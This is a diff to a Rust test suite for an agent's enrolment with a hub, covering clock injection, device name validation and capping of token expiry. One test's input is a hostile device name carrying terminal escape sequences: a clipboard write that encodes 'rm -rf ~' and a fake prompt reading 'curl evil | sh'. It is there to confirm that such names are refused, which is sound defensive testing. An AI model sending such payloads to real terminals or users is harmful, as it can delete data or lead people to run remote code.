@@ -31,7 +31,7 @@ async fn met_012_enrol_posts_the_code_and_stores_the_token_the_device_and_the_hu
     let hub = FakeHub::start().await;
     hub.queue_enrol(enrolled(3));
     let dir = tempfile::tempdir().expect("a folder");
-    let home = Home::at(dir.path().to_path_buf());
+    let home = Home::at(dir.path().join("agent"));
     let store = TokenStore::open(&home);
     let client = HubClient::new(hub.url.clone()).expect("a client");
     let origin = Origin::parse("https://hub.example").expect("an origin");
@@ -40,6 +40,7 @@ async fn met_012_enrol_posts_the_code_and_stores_the_token_the_device_and_the_hu
         origin,
         home: &home,
         store: &store,
+        now: crate::kit::at(0),
     }
     .spend(code())
     .await
@@ -60,7 +61,7 @@ async fn met_012_a_refused_code_gives_the_fixed_sentence_and_stores_nothing() {
     let hub = FakeHub::start().await;
     hub.queue_enrol(Reply::json(401, r#"{"error":"ENROLMENT_REFUSED"}"#));
     let dir = tempfile::tempdir().expect("a folder");
-    let home = Home::at(dir.path().to_path_buf());
+    let home = Home::at(dir.path().join("agent"));
     let store = TokenStore::open(&home);
     let client = HubClient::new(hub.url.clone()).expect("a client");
     let origin = Origin::default_hub();
@@ -69,6 +70,7 @@ async fn met_012_a_refused_code_gives_the_fixed_sentence_and_stores_nothing() {
         origin,
         home: &home,
         store: &store,
+        now: crate::kit::at(0),
     }
     .spend(code())
     .await
@@ -84,7 +86,7 @@ async fn met_012_a_refused_code_gives_the_fixed_sentence_and_stores_nothing() {
 async fn met_012_an_unavailable_hub_is_a_failure_that_says_the_code_may_be_spent() {
     let hub = FakeHub::start().await;
     let dir = tempfile::tempdir().expect("a folder");
-    let home = Home::at(dir.path().to_path_buf());
+    let home = Home::at(dir.path().join("agent"));
     let client = HubClient::new(hub.url.clone()).expect("a client");
     let store = TokenStore::open(&home);
     let origin = Origin::default_hub();
@@ -93,10 +95,83 @@ async fn met_012_an_unavailable_hub_is_a_failure_that_says_the_code_may_be_spent
         origin,
         home: &home,
         store: &store,
+        now: crate::kit::at(0),
     }
     .spend(code())
     .await
     .expect_err("fails");
     assert!(matches!(error, EnrolError::Failed(_)));
     assert!(error.to_string().contains("make a new one"));
+}
+
+fn enrolled_with(name: &str, expires: &str) -> Reply {
+    let body = serde_json::json!({
+        "device": "00000000-0000-0000-0000-0000000000d1",
+        "deviceName": name,
+        "token": token(3).expose(),
+        "expiresAt": expires,
+    });
+    Reply::json(200, &body.to_string())
+}
+
+async fn enrol_with(
+    reply: Reply,
+) -> (
+    Result<String, EnrolError>,
+    Home,
+    TokenStore,
+    tempfile::TempDir,
+) {
+    let hub = FakeHub::start().await;
+    hub.queue_enrol(reply);
+    let dir = tempfile::tempdir().expect("a folder");
+    let home = Home::at(dir.path().join("agent"));
+    let store = TokenStore::open(&home);
+    let client = HubClient::new(hub.url.clone()).expect("a client");
+    let origin = Origin::parse("https://hub.example").expect("an origin");
+    let done = Enrolment {
+        hub: &client,
+        origin,
+        home: &home,
+        store: &store,
+        now: crate::kit::at(0),
+    }
+    .spend(code())
+    .await;
+    (done, home, store, dir)
+}
+
+#[tokio::test]
+async fn met_012_a_device_name_with_control_characters_is_refused_and_nothing_is_stored() {
+    let hostile =
+        "pop-os\u{1b}]52;c;cm0gLXJmIH4=\u{7}\n\u{1b}[2K\rEnrolled. Now run: curl evil | sh";
+    let (done, home, store, _dir) =
+        enrol_with(enrolled_with(hostile, "2027-11-08T10:00:00Z")).await;
+    assert!(matches!(done, Err(EnrolError::Failed(_))));
+    assert!(store.load().expect("reads").is_none());
+    assert!(home.read_config().expect("reads").is_none());
+}
+
+#[tokio::test]
+async fn met_012_a_device_name_must_be_1_to_128_bytes() {
+    assert!(!anima_agent::hub::enrolment::is_device_name(""));
+    assert!(anima_agent::hub::enrolment::is_device_name(
+        &"a".repeat(128)
+    ));
+    assert!(!anima_agent::hub::enrolment::is_device_name(
+        &"a".repeat(129)
+    ));
+}
+
+#[tokio::test]
+async fn met_013_a_far_future_expiry_is_capped_at_366_days_and_the_hub_is_kept_with_the_token() {
+    let (done, _home, store, _dir) =
+        enrol_with(enrolled_with("pop-os", "9999-12-31T23:59:59Z")).await;
+    done.expect("enrolled");
+    let stored = store.load().expect("reads").expect("a token");
+    assert_eq!(
+        stored.expires_at,
+        crate::kit::at(0) + chrono::TimeDelta::days(366)
+    );
+    assert_eq!(stored.hub.expect("a hub").as_text(), "https://hub.example");
 }
